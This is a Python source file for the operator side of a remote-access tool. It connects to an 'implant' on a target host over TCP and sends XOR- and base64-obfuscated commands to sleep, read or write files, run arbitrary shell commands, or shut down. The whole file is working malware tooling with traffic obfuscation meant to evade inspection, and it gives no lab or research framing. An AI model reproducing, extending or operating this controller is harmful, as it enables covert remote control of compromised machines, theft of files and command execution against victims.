import socket
import json
import base64
import sys

XOR_KEY = b'keyed_up'


def xor_obfuscate(data):
    key_len = len(XOR_KEY)
    return bytes([b ^ XOR_KEY[i % key_len] for i, b in enumerate(data)])

def xor_deobfuscate(data):
    return xor_obfuscate(data)

def base64_obfuscate(data):
    return base64.b64encode(data)

def base64_deobfuscate(data):
    return base64.b64decode(data)


def usage():
    print(f"Usage: {sys.argv[0]} <host> [port]")
    print("Example:")
    print(f"  {sys.argv[0]} 192.168.20.19")
    print(f"  {sys.argv[0]} 192.168.20.19 4444")
    sys.exit(1)


def send_command(sock, cmd_type, req_id, payload):
    message = {
        "type": cmd_type,
        "request_id": req_id,
        "payload": payload
    }

    plaintext = json.dumps(message).encode('utf-8')
    obfuscated = base64_obfuscate(xor_obfuscate(plaintext))

    sock.sendall(len(obfuscated).to_bytes(4, "big") + obfuscated)

    len_data = sock.recv(4)
    if not len_data:
        raise ConnectionError("Connection closed by implant")

    resp_len = int.from_bytes(len_data, "big")

    resp_data = b''
    while len(resp_data) < resp_len:
        chunk = sock.recv(resp_len - len(resp_data))
        if not chunk:
            break
        resp_data += chunk

    try:
        decoded = base64_deobfuscate(resp_data)
        plaintext = xor_deobfuscate(decoded)
        response = json.loads(plaintext.decode('utf-8'))
        return response
    except Exception as e:
        return {
            "type": "error",
            "request_id": req_id,
            "payload": {"code": "PROCESSING_ERROR", "message": str(e)}
        }


def main():
    if len(sys.argv) < 2:
        usage()

    HOST = sys.argv[1]
    PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    print(f"Controller connected to implant at {HOST}:{PORT}")

    req_id = 1

    try:
        while True:
            cmd_line = input("> ").strip()
            if not cmd_line:
                continue

            parts = cmd_line.split()
            cmd = parts[0].upper()
            args = parts[1:]

            if cmd == "HELLO":
                payload = {}

            elif cmd == "SHUTDOWN":
                payload = {}

            elif cmd == "SET_SLEEP":
                if not args:
                    print("Usage: SET_SLEEP <seconds>")
                    continue
                try:
                    seconds = int(args[0])
                except ValueError:
                    print("Seconds must be integer")
                    continue
                payload = {"seconds": seconds}

            elif cmd == "READ_DATA":
                filename = args[0] if args else None
                payload = {"filename": filename} if filename else {}

            elif cmd == "WRITE_DATA":
                if len(args) < 2:
                    print("Usage: WRITE_DATA <filename> <data>")
                    continue
                filename = args[0]
                data = ' '.join(args[1:])
                payload = {"filename": filename, "data": data}

            elif cmd == "RUN_CMD":
                if not args:
                    print("Usage: RUN_CMD <command>")
                    continue
                command = ' '.join(args)
                payload = {"command": command}

            else:
                print(f"Unknown command: {cmd}")
                print("Usage: HELLO, SHUTDOWN, SET_SLEEP, READ_DATA, WRITE_DATA, RUN_CMD")
                continue

            resp = send_command(sock, cmd, req_id, payload)
            print("Response:", json.dumps(resp, indent=2))

            if cmd == "SHUTDOWN":
                break

            req_id += 1

    except KeyboardInterrupt:
        print("\nController Interrupted")

    finally:
        sock.close()
        print("Controller disconnected")


if __name__ == "__main__":
    main()
